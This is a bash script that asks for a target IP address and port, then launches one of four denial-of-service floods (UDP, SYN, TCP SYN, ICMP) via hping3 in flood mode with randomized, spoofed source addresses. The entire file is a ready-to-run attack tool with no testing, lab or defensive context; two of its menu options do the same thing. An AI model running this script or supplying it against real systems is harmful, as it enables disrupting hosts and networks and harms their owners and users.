#!/bin/bash

read -p "Enter the target IP address: " target_ip

read -p "Enter the target port: " target_port

echo "Choose a DDoS attack type:"
echo "1. UDP Flood"
echo "2. TCP Flood (SYN)"
echo "3. SYN Flood"
echo "4. ICMP Flood"

read -p "Enter the attack type (1-4) : " attack_type

# Perform the chosen DDoS attack on the specified port
case $attack_type in
  1) echo "Performing UDP Flood on port $target_port..."; hping3 --flood --udp --rand-source --destport $target_port $target_ip;;
  2) echo "Performing TCP Flood on port $target_port..."; hping3 --flood -S --rand-source $target_ip --destport $target_port;;
  3) echo "Performing SYN Flood on port $target_port..."; hping3 --flood --syn --rand-source --destport $target_port $target_ip;;
  4) echo "Performing ICMP Flood on port $target_port..."; hping3 --flood --icmp --rand-source --destport $target_port $target_ip;;
  *) echo "Invalid attack type. Exiting..."; exit 1;;
esac
